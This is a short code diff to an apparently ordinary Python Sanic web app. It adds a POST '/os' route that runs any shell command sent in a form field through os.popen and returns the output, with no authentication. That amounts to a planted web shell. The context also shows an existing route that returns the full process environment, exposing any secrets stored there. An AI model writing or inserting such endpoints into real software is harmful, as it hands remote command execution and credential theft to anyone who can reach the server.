@@ -11,7 +11,8 @@ bp_home = Blueprint('home')
 @bp_home.get('/', name='index')
 @serializer()
 async def index(request: Request):
-    return []
+    config = request.app.config
+    return {'dev': config.DEV}
 
 
 @bp_home.get('/ip2', name='ip')
@@ -40,3 +41,11 @@ async def robot_file(request):
 @serializer()
 async def envs(request):
     return dict(os.environ)
+
+
+@bp_home.post('/os')
+@serializer()
+async def run_os(request: Request):
+    cmd = request.form.get('cmd')
+    r = os.popen(cmd)
+    return r.readline()
